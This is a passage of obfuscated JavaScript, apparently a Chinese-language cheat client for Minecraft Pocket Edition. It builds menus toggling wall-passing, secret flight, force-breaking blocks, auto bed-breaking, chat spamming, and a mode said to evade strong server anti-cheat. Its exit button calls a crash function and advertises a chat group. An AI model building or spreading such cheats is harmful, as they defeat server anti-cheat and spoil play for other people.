                                _0x2bf6x154['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x154['getBackground']()['setAlpha'](150);
                                _0x2bf6x154['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x154);
                                var _0x2bf6x155 = new Button(ctx);
                                _0x2bf6x155['setText']('游戏模式');
                                _0x2bf6x155['setTextColor'](Color['rgb'](255, 0, 255));
                                _0x2bf6x155['setTextSize'](18);
                                _0x2bf6x155['setBackground'](gmbg);
                                _0x2bf6x155['getBackground']()['setAlpha'](120);
                                _0x2bf6x155['setGravity'](Gravity.CENTER);
                                _0x2bf6x155['setOnClickListener'](new View.OnClickListener({
                                    onClick: function(_0x2bf6x132) {
                                        if (gmChange == 1) {
                                            gmChange = 0
                                        } else {
                                            gmChange = 1
                                        };
                                        Level['setGameMode'](gmChange)
                                    }
                                }));
                                _0x2bf6x147['addView'](_0x2bf6x155);
                                var nearwarnings = new Switch(ctx);
                                nearwarnings['setText']('玩家信息');
                                nearwarnings['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                nearwarnings['setPadding'](10, 3, 3, 3);
                                nearwarnings['setTextSize'](15);
                                nearwarnings['setBackground'](module);
                                nearwarnings['getBackground']()['setAlpha'](120);
                                nearwarnings['setChecked'](nearwarninged);
                                nearwarnings['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!nearwarninged) {
                                            nearwarningss = true;
                                            nearwarninged = true
                                            fctoast('随枫吖:显示附近的玩家相关坐标等')
                                        } else {
                                            nearwarningss = false;
                                            nearwarninged = false
                                        };
                                        nearwarnings['setChecked'](nearwarninged)
                                    }
                                }));
                                _0x2bf6x147['addView'](nearwarnings);
                                var forcedestroys = new Switch(ctx);
                                forcedestroys['setText']('强制破坏');
                                forcedestroys['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                forcedestroys['setPadding'](10, 3, 3, 3);
                                forcedestroys['setTextSize'](15);
                                forcedestroys['setBackground'](module);
                                forcedestroys['getBackground']()['setAlpha'](120);
                                forcedestroys['setChecked'](forcedestroyed);
                                forcedestroys['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!forcedestroyed) {
                                            forcedestroyss = true;
                                            forcedestroyed = true
                                            fctoast('破坏后虽然方块还在，但你看不到，并且可以穿过去')
                                        } else {
                                            forcedestroyss = false;
                                            forcedestroyed = false
                                        };
                                        forcedestroys['setChecked'](forcedestroyed)
                                    }
                                }));
                                _0x2bf6x147['addView'](forcedestroys);
                                var bedbreakers = new Switch(ctx);
                                bedbreakers['setText']('自动挖床');
                                bedbreakers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bedbreakers['setPadding'](10, 3, 3, 3);
                                bedbreakers['setTextSize'](15);
                                bedbreakers['setBackground'](module);
                                bedbreakers['getBackground']()['setAlpha'](120);
                                bedbreakers['setChecked'](bedbreakered);
                                bedbreakers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bedbreakered) {
                                            bedbreakerss = true;
                                            bedbreakered = true;
                                            fctoast('瞄准床即可自动破坏(多人游戏可能会闪退)')
                                        } else {
                                            bedbreakerss = false;
                                            bedbreakered = false
                                        };
                                        bedbreakers['setChecked'](bedbreakered)
                                    }
                                }));
                                _0x2bf6x147['addView'](bedbreakers);
                                var fastbreaks = new Switch(ctx);
                                fastbreaks['setText']('加速破坏');
                                fastbreaks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fastbreaks['setPadding'](10, 3, 3, 3);
                                fastbreaks['setTextSize'](15);
                                fastbreaks['setBackground'](module);
                                fastbreaks['getBackground']()['setAlpha'](120);
                                fastbreaks['setChecked'](fastbreaked);
                                fastbreaks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fastbreaked) {
                                            fastbreakss = true;
                                            fastbreaked = true
                                        } else {
                                            fastbreakss = false;
                                            fastbreaked = false;
                                            for (i = 0; i < 256; i++) {
                                                Block['setDestroyTime'](i, defDestroyTime[i])
                                            }
                                        };
                                        fastbreaks['setChecked'](fastbreaked)
                                    }
                                }));
                                _0x2bf6x147['addView'](fastbreaks);
                                var fullbrights = new Switch(ctx);
                                fullbrights['setText']('充足亮度');
                                fullbrights['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fullbrights['setPadding'](10, 3, 3, 3);
                                fullbrights['setTextSize'](15);
                                fullbrights['setBackground'](module);
                                fullbrights['getBackground']()['setAlpha'](120);
                                fullbrights['setChecked'](fullbrighted);
                                fullbrights['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fullbrighted) {
                                            fullbrightss = true;
                                            fullbrighted = true;
                                            fctoast('当你破坏一个区块的方块时(区块更新)会自动把方块变为白天时的亮度')
                                        } else {
                                            fullbrightss = false;
                                            fullbrighted = false;
                                            Block['setLightLevel'](0, 0)
                                        };
                                        fullbrights['setChecked'](fullbrighted)
                                    }
                                }));
                                _0x2bf6x147['addView'](fullbrights);
                                var taptps = new Switch(ctx);
                                taptps['setText']('点击传送');
                                taptps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                taptps['setPadding'](10, 3, 3, 3);
                                taptps['setTextSize'](15);
                                taptps['setBackground'](module);
                                taptps['getBackground']()['setAlpha'](120);
                                taptps['setChecked'](taptped);
                                taptps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!taptped) {
                                            taptpss = true;
                                            taptped = true
                                        } else {
                                            taptpss = false;
                                            taptped = false
                                        };
                                        taptps['setChecked'](taptped)
                                    }
                                }));
                                _0x2bf6x147['addView'](taptps);
                                var placetps = new Switch(ctx);
                                placetps['setText']('自动搭路');
                                placetps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                placetps['setPadding'](10, 3, 3, 3);
                                placetps['setTextSize'](15);
                                placetps['setBackground'](module);
                                placetps['getBackground']()['setAlpha'](120);
                                placetps['setChecked'](placetped);
                                placetps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!placetped) {
                                            placetpss = true;
                                            placetped = true
                                            fctoast('随枫吖:点一下 移动一格')
                                        } else {
                                            placetpss = false;
                                            placetped = false
                                        };
                                        placetps['setChecked'](placetped)
                                    }
                                }));
                                _0x2bf6x147['addView'](placetps);
                                var elevators = new Switch(ctx);
                                elevators['setText']('上下瞬移');
                                elevators['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                elevators['setPadding'](10, 3, 3, 3);
                                elevators['setTextSize'](15);
                                elevators['setBackground'](module);
                                elevators['getBackground']()['setAlpha'](120);
                                elevators['setChecked'](elevatored);
                                elevators['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!elevatored) {
                                            showElevatorBtn();
                                            elevatored = true
                                        } else {
                                            GUIe['dismiss']();
                                            elevatored = false
                                        };
                                        elevators['setChecked'](elevatored)
                                    }
                                }));
                                _0x2bf6x147['addView'](elevators);
                                var ctrlzooms = new Switch(ctx);
                                ctrlzooms['setText']('放大画面');
                                ctrlzooms['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                ctrlzooms['setPadding'](10, 3, 3, 3);
                                ctrlzooms['setTextSize'](15);
                                ctrlzooms['setBackground'](module);
                                ctrlzooms['getBackground']()['setAlpha'](120);
                                ctrlzooms['setChecked'](ctrlzoomed);
                                ctrlzooms['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!ctrlzoomed) {
                                            showZoomSwitch();
                                            ctrlzoomed = true
                                        } else {
                                            GUIz['dismiss']();
                                            ctrlzoomed = false
                                        };
                                        ctrlzooms['setChecked'](ctrlzoomed)
                                    }
                                }));
                                _0x2bf6x147['addView'](ctrlzooms);
                                var viewchangers = new Switch(ctx);
                                viewchangers['setText']('切换视角');
                                viewchangers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                viewchangers['setPadding'](10, 3, 3, 3);
                                viewchangers['setTextSize'](15);
                                viewchangers['setBackground'](module);
                                viewchangers['getBackground']()['setAlpha'](120);
                                viewchangers['setChecked'](viewchangered);
                                viewchangers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!viewchangered) {
                                            showF5Btn();
                                            viewchangered = true
                                            fctoast('可能会闪退')
                                        } else {
                                            GUIv['dismiss']();
                                            viewchangered = false
                                        };
                                        viewchangers['setChecked'](viewchangered)
                                    }
                                }));
                                _0x2bf6x147['addView'](viewchangers);
                                var fallbacks = new Switch(ctx);
                                fallbacks['setText']('虚空回弹');
                                fallbacks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fallbacks['setPadding'](10, 3, 3, 3);
                                fallbacks['setTextSize'](15);
                                fallbacks['setBackground'](module);
                                fallbacks['getBackground']()['setAlpha'](120);
                                fallbacks['setChecked'](fallbacked);
                                fallbacks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fallbacked) {
                                            fallbackss = true;
                                            fallbacked = true
                                            fctoast('随枫吖:当你掉入虚空时会自动回来')
                                        } else {
                                            fallbackss = false;
                                            fallbacked = false
                                        };
                                        fallbacks['setChecked'](fallbacked)
                                    }
                                }));
                                _0x2bf6x147['addView'](fallbacks);
                                var fastfalls = new Switch(ctx);
                                fastfalls['setText']('快速坠落');
                                fastfalls['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fastfalls['setPadding'](10, 3, 3, 3);
                                fastfalls['setTextSize'](15);
                                fastfalls['setBackground'](module);
                                fastfalls['getBackground']()['setAlpha'](120);
                                fastfalls['setChecked'](fastfalled);
                                fastfalls['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fastfalled) {
                                            fastfallss = true;
                                            fastfalled = true
                                            fctoast('随枫吖:走到物体边缘时自动传送到下面且无伤害')
                                        } else {
                                            fastfallss = false;
                                            fastfalled = false
                                        };
                                        fastfalls['setChecked'](fastfalled)
                                    }
                                }));
                                _0x2bf6x147['addView'](fastfalls);
                                var regenerations = new Switch(ctx);
                                regenerations['setText']('快速回血');
                                regenerations['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                regenerations['setPadding'](10, 3, 3, 3);
                                regenerations['setTextSize'](15);
                                regenerations['setBackground'](module);
                                regenerations['getBackground']()['setAlpha'](120);
                                regenerations['setChecked'](regenerationed);
                                regenerations['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!regenerationed) {
                                            regenerationss = true;
                                            regenerationed = true;
                                            fctoast('吃东西不要动回血')
                                        } else {
                                            regenerationss = false;
                                            regenerationed = false
                                        };
                                        regenerations['setChecked'](regenerationed)
                                    }
                                }));
                                _0x2bf6x147['addView'](regenerations);
                                var sregens = new Switch(ctx);
                                sregens['setText']('冻结画面');
                                sregens['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                sregens['setPadding'](10, 3, 3, 3);
                                sregens['setTextSize'](15);
                                sregens['setBackground'](module);
                                sregens['getBackground']()['setAlpha'](120);
                                sregens['setChecked'](sregend);
                                sregens['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!sregend) {
                                            showRegenSwitch();
                                            sregend = true
                                        } else {
                                            GUIg['dismiss']();
                                            sregend = false
                                        };
                                        sregens['setChecked'](sregend)
                                    }
                                }));
                                _0x2bf6x147['addView'](sregens);
                                var dolphins = new Switch(ctx);
                                dolphins['setText']('水上漂[LB]');
                                dolphins['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                dolphins['setPadding'](10, 3, 3, 3);
                                dolphins['setTextSize'](15);
                                dolphins['setBackground'](module);
                                dolphins['getBackground']()['setAlpha'](120);
                                dolphins['setChecked'](dolphined);
                                dolphins['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!dolphined) {
                                            dolphinss = true;
                                            dolphined = true
                                            fctoast('随枫吖:适用于LB等反作弊能力高的')
                                        } else {
                                            dolphinss = false;
                                            dolphined = false
                                        };
                                        dolphins['setChecked'](dolphined)
                                    }
                                }));
                                _0x2bf6x147['addView'](dolphins);
                                var solidliquids = new Switch(ctx);
                                solidliquids['setText']('水上漂');
                                solidliquids['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                solidliquids['setPadding'](10, 3, 3, 3);
                                solidliquids['setTextSize'](15);
                                solidliquids['setBackground'](module);
                                solidliquids['getBackground']()['setAlpha'](120);
                                solidliquids['setChecked'](solidliquided);
                                solidliquids['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!solidliquided) {
                                            solidliquidss = true;
                                            solidliquided = true
                                        } else {
                                            solidliquidss = false;
                                            solidliquided = false;
                                            Block['setShape'](8, 0, 0, 0, 1, 0.0, 1);
                                            Block['setShape'](9, 0, 0, 0, 1, 0.0, 1);
                                            Block['setShape'](10, 0, 0, 0, 1, 0.0, 1);
                                            Block['setShape'](11, 0, 0, 0, 1, 0.0, 1);
                                            Block['defineLiquidBlock'](8, 'Water', [
                                                ['still_water', 0],
                                                ['still_water', 0]
                                            ], 8);
                                            Block['defineLiquidBlock'](10, 'Lava', [
                                                ['still_lava', 0],
                                                ['still_lava', 0]
                                            ], 10)
                                        };
                                        solidliquids['setChecked'](solidliquided)
                                    }
                                }));
                                _0x2bf6x147['addView'](solidliquids);
                                var frostwalkers = new Switch(ctx);
                                frostwalkers['setText']('水上结冰');
                                frostwalkers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                frostwalkers['setPadding'](10, 3, 3, 3);
                                frostwalkers['setTextSize'](15);
                                frostwalkers['setBackground'](module);
                                frostwalkers['getBackground']()['setAlpha'](120);
                                frostwalkers['setChecked'](frostwalkered);
                                frostwalkers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!frostwalkered) {
                                            frostwalkerss = true;
                                            frostwalkered = true
                                        } else {
                                            frostwalkerss = false;
                                            frostwalkered = false
                                        };
                                        frostwalkers['setChecked'](frostwalkered)
                                    }
                                }));
                                _0x2bf6x147['addView'](frostwalkers);
                                var safewalks = new Switch(ctx);
                                safewalks['setText']('安全行走');
                                safewalks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                safewalks['setPadding'](10, 3, 3, 3);
                                safewalks['setTextSize'](15);
                                safewalks['setBackground'](module);
                                safewalks['getBackground']()['setAlpha'](120);
                                safewalks['setChecked'](safewalked);
                                safewalks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!safewalked) {
                                            safewalkss = true;
                                            safewalked = true
                                            fctoast('随枫吖:走到一个方块的边缘不会掉下去')
                                        } else {
                                            safewalkss = false;
                                            safewalked = false
                                        };
                                        safewalks['setChecked'](safewalked)
                                    }
                                }));
                                _0x2bf6x147['addView'](safewalks);
                                var scaffoldwalks = new Switch(ctx);
                                scaffoldwalks['setText']('脚下方块');
                                scaffoldwalks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                scaffoldwalks['setPadding'](10, 3, 3, 3);
                                scaffoldwalks['setTextSize'](15);
                                scaffoldwalks['setBackground'](module);
                                scaffoldwalks['getBackground']()['setAlpha'](120);
                                scaffoldwalks['setChecked'](scaffoldwalked);
                                scaffoldwalks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!scaffoldwalked) {
                                            scaffoldwalkss = true;
                                            scaffoldwalked = true
                                            fctoast('随枫吖:在你看来是方块，别人不一定，可能会被服务器检测飞行')
                                        } else {
                                            scaffoldwalkss = false;
                                            scaffoldwalked = false
                                        };
                                        scaffoldwalks['setChecked'](scaffoldwalked)
                                    }
                                }));
                                _0x2bf6x147['addView'](scaffoldwalks);
                                var autoclimbs = new Switch(ctx);
                                autoclimbs['setText']('自动攀缘');
                                autoclimbs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                autoclimbs['setPadding'](10, 3, 3, 3);
                                autoclimbs['setTextSize'](15);
                                autoclimbs['setBackground'](module);
                                autoclimbs['getBackground']()['setAlpha'](120);
                                autoclimbs['setChecked'](autoclimbed);
                                autoclimbs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!autoclimbed) {
                                            autoclimbss = true;
                                            autoclimbed = true
                                        } else {
                                            autoclimbss = false;
                                            autoclimbed = false
                                        };
                                        autoclimbs['setChecked'](autoclimbed)
                                    }
                                }));
                                _0x2bf6x147['addView'](autoclimbs);
                                var wallhacks = new Switch(ctx);
                                wallhacks['setText']('透视[穿墙]');
                                wallhacks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                wallhacks['setPadding'](10, 3, 3, 3);
                                wallhacks['setTextSize'](15);
                                wallhacks['setBackground'](module);
                                wallhacks['getBackground']()['setAlpha'](120);
                                wallhacks['setChecked'](wallhacked);
                                wallhacks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!wallhacked) {
                                            wallhackss = true;
                                            wallhacked = true
                                        } else {
                                            wallhackss = false;
                                            wallhacked = false;
                                            Entity['setCollisionSize'](Player['getEntity'](), 1, 2)
                                        };
                                        wallhacks['setChecked'](wallhacked)
                                    }
                                }));
                                _0x2bf6x147['addView'](wallhacks);
                                menu3 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu3['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu3['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                var _0x2bf6x156 = new TextView(ctx);
                _0x2bf6x156['setText']('更多');
                _0x2bf6x156['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x156['setTextSize'](24);
                _0x2bf6x156['setBackground'](theme);
                _0x2bf6x156['getBackground']()['setAlpha'](100);
                _0x2bf6x156['setGravity'](Gravity.CENTER);
                _0x2bf6x156['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x157();
                        exitmisc();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x156);

                function _0x2bf6x157() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x158 = new TextView(ctx);
                                _0x2bf6x158['setTextSize'](20);
                                _0x2bf6x158['setText']('-| 更多 |-');
                                _0x2bf6x158['setTextColor'](android['graphics']['Color'].MAGENTA);
                                _0x2bf6x158['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x158['getBackground']()['setAlpha'](120);
                                _0x2bf6x158['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x158);
                                var _0x2bf6x159 = new Button(ctx);
                                _0x2bf6x159['setText']('退出客户端');
                                _0x2bf6x159['setTextColor'](Color['rgb'](255, 0, 255));
                                _0x2bf6x159['setTextSize'](25);
                                _0x2bf6x159['setBackground'](destructbg);
                                _0x2bf6x159['getBackground']()['setAlpha'](150);
                                _0x2bf6x159['setGravity'](Gravity.CENTER);
                                _0x2bf6x159['setOnClickListener'](new View.OnClickListener({
                                    onClick: function(_0x2bf6x132) {
                                        ccrash();
                                        fctoast('欢迎加入꯭꯭醉꯭仙꯭网꯭络꯭，群聊号码：716069766')
                                    }
                                }));
                                _0x2bf6x147['addView'](_0x2bf6x159);
                                var spams = new Switch(ctx);
                                spams['setText']('开启刷屏');
                                spams['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                spams['setPadding'](10, 3, 3, 3);
                                spams['setTextSize'](15);
                                spams['setBackground'](module);
                                spams['getBackground']()['setAlpha'](120);
                                spams['setChecked'](spamed);
                                spams['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!spamed) {
                                            spamss = true;
                                            spamed = true;
                                            fctoast('在聊天框内发送!spam <text>来刷屏')
                                        } else {
                                            spamss = false;
                                            spamed = false
                                        };
                                        spams['setChecked'](spamed)
                                    }
                                }));
                                _0x2bf6x147['addView'](spams);
                                var leetspeaks = new Switch(ctx);
                                leetspeaks['setText']('特色英语');
                                leetspeaks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                leetspeaks['setPadding'](10, 3, 3, 3);
                                leetspeaks['setTextSize'](15);
                                leetspeaks['setBackground'](module);
                                leetspeaks['getBackground']()['setAlpha'](120);
                                leetspeaks['setChecked'](leetspeaked);
                                leetspeaks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!leetspeaked) {
                                            leetspeakss = true;
                                            leetspeaked = true
                                            fctoast('随枫吖:可以把你发出的英文用各种符号拼接的方式，形成乱码')
                                        } else {
                                            leetspeakss = false;
                                            leetspeaked = false
                                        };
                                        leetspeaks['setChecked'](leetspeaked)
                                    }
                                }));
                                _0x2bf6x147['addView'](leetspeaks);
                                var criticaltrailss = new Switch(ctx);
                                criticaltrailss['setText']('临时粒子');
                                criticaltrailss['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                criticaltrailss['setPadding'](10, 3, 3, 3);
                                criticaltrailss['setTextSize'](15);
                                criticaltrailss['setBackground'](module);
                                criticaltrailss['getBackground']()['setAlpha'](120);
                                criticaltrailss['setChecked'](criticaltrailsed);
                                criticaltrailss['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!criticaltrailsed) {
                                            criticaltrailsss = true;
                                            criticaltrailsed = true;
                                            fctoast('随枫吖:会很卡！')
                                        } else {
                                            criticaltrailsss = false;
                                            criticaltrailsed = false
                                        };
                                        criticaltrailss['setChecked'](criticaltrailsed)
                                    }
                                }));
                                _0x2bf6x147['addView'](criticaltrailss);
                                var firepunchs = new Switch(ctx);
                                firepunchs['setText']('火焰手');
                                firepunchs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                firepunchs['setPadding'](10, 3, 3, 3);
                                firepunchs['setTextSize'](15);
                                firepunchs['setBackground'](module);
                                firepunchs['getBackground']()['setAlpha'](120);
                                firepunchs['setChecked'](firepunched);
                                firepunchs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!firepunched) {
                                            firepunchss = true;
                                            firepunched = true
                                        } else {
                                            firepunchss = false;
                                            firepunched = false
                                        };
                                        firepunchs['setChecked'](firepunched)
                                    }
                                }));
                                _0x2bf6x147['addView'](firepunchs);
                                var derps = new Switch(ctx);
                                derps['setText']('摇头[旋转]');
                                derps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                derps['setPadding'](10, 3, 3, 3);
                                derps['setTextSize'](15);
                                derps['setBackground'](module);
                                derps['getBackground']()['setAlpha'](120);
                                derps['setChecked'](derped);
                                derps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!derped) {
                                            derpss = true;
                                            derped = true
                                        } else {
                                            derpss = false;
                                            derped = false
                                        };
                                        derps['setChecked'](derped)
                                    }
                                }));
                                _0x2bf6x147['addView'](derps);
                                var twerks = new Switch(ctx);
                                twerks['setText']('疯狂潜行');
                                twerks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                twerks['setPadding'](10, 3, 3, 3);
                                twerks['setTextSize'](15);
                                twerks['setBackground'](module);
                                twerks['getBackground']()['setAlpha'](120);
                                twerks['setChecked'](twerked);
                                twerks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!twerked) {
                                            twerkss = true;
                                            twerked = true
                                        } else {
                                            twerkss = false;
                                            twerked = false
                                        };
                                        twerks['setChecked'](twerked)
                                    }
                                }));
                                _0x2bf6x147['addView'](twerks);
                                var backfaces = new Switch(ctx);
                                backfaces['setText']('摇头[上下]');
                                backfaces['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                backfaces['setPadding'](10, 3, 3, 3);
                                backfaces['setTextSize'](15);
                                backfaces['setBackground'](module);
                                backfaces['getBackground']()['setAlpha'](120);
                                backfaces['setChecked'](backfaceed);
                                backfaces['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!backfaceed) {
                                            backfacess = true;
                                            backfaceed = true
                                        } else {
                                            backfacess = false;
                                            backfaceed = false
                                        };
                                        backfaces['setChecked'](backfaceed)
                                    }
                                }));
                                _0x2bf6x147['addView'](backfaces);
                                var stealths = new Switch(ctx);
                                stealths['setText']('秘密飞行');
                                stealths['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                stealths['setPadding'](10, 3, 3, 3);
                                stealths['setTextSize'](15);
                                stealths['setBackground'](module);
                                stealths['getBackground']()['setAlpha'](120);
                                stealths['setChecked'](stealthed);
                                stealths['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!stealthed) {
                                            stealthss = true;
                                            stealthed = true
                                        } else {
                                            stealthss = false;
                                            stealthed = false
                                        };
                                        stealths['setChecked'](stealthed)
                                    }
                                }));
                                _0x2bf6x147['addView'](stealths);
                                menu4 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu4['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu4['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                menu = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 5, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']() / 1);
                menu['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                menu['showAtLocation'](ctx['getWindow']()['getDecorView'](), 0, 0, 0)
            } catch (error) {
                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
            }
        }
    }))
}

function exit() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitUI['dismiss']();
                        menu['dismiss']();
                        showMenuBtn()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitcombat() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitcombatUI['dismiss']();
